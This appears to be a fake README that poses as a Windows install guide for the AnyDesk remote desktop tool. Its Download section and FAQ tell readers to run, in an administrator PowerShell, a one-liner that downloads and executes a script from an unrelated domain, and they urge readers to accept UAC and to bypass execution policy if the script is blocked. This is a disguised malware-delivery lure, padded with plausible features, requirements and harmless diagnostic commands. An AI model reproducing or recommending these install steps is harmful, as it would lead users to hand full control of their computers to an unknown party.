# AnyDesk Suite — Windows Remote Desktop Guide (10 & 11)

Install walkthrough · Configuration notes · Windows desktop use.

**AnyDesk Suite** on **Windows 10 and 11** — documented install steps, remote desktop access, and routine notes for it support staff and remote teams.

## Download

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) — setup runs automatically
4. Wait until the window reports setup finished — then open **AnyDesk Suite** from Start or the desktop shortcut

<details>
<summary><b>Having trouble? Try this instead</b></summary>

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

## Overview

This README documents **AnyDesk Suite** on Windows 10 and 11: preparation, install order, and practical notes for remote desktop access. Start with **Download**, then use **FAQ** and **Features**.

## FAQ

| Question | Answer |
| --- | --- |
| Where is the installer? | Open **PowerShell as Administrator**, paste the command from step 2 in **Download**, and press Enter. |
| ExecutionPolicy blocked the script? | Use the **Having trouble?** command in **Download** — it runs with **Bypass** for that session only. |
| Windows versions? | Windows 10 and 11, 64-bit. |
| UAC prompt? | Choose **Yes** when Windows asks during step 3 — required for setup. |

## Features

- Remote sessions
- File transfer
- Multi-monitor
- Unattended access
- Session codes
- Address book
- Session logs

## Use cases

- IT support
- Remote teams
- Help desks

## Developer reference

Not required for install. Read-only checks useful for support tickets and local sanity checks.

**Release metadata (session labels only)**

```powershell
$ReleaseChannel = "Stable"
$ProductSlug    = "AnyDesk-Full-Setup"
$BuildLabel     = "2026.04"
```

**Host environment**

```powershell
$PSVersionTable.PSVersion
Get-ExecutionPolicy -List
[System.Environment]::Is64BitOperatingSystem
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
```

**Post-install (application layer)**

```powershell
Get-Process -Name "AnyDesk*" -ErrorAction SilentlyContinue |
  Select-Object Name, Id, StartTime
Get-Service -Name "AnyDesk*" -ErrorAction SilentlyContinue |
  Format-Table Name, Status, StartType -AutoSize
```

**Support bundle header (paste into ticket)**

```powershell
@{
  captured_utc = (Get-Date).ToUniversalTime().ToString("o")
  user         = [Environment]::UserName
  machine      = $env:COMPUTERNAME
  channel      = $ReleaseChannel
  product      = $ProductSlug
} | ConvertTo-Json -Compress
```

## System requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum · 8 GB recommended |
| Disk | 500 MB free space |

## Topics

`anydesk-windows` · `anydesk-config` · `anydesk-integration` · `anydesk-latest` · `anydesk-portable` · `remote-desktop` · `remote-support` · `remote-session-manager`

## License

This repository describes installation and usage of a third-party remote-desktop application. Comply with applicable software licensing and local regulations.
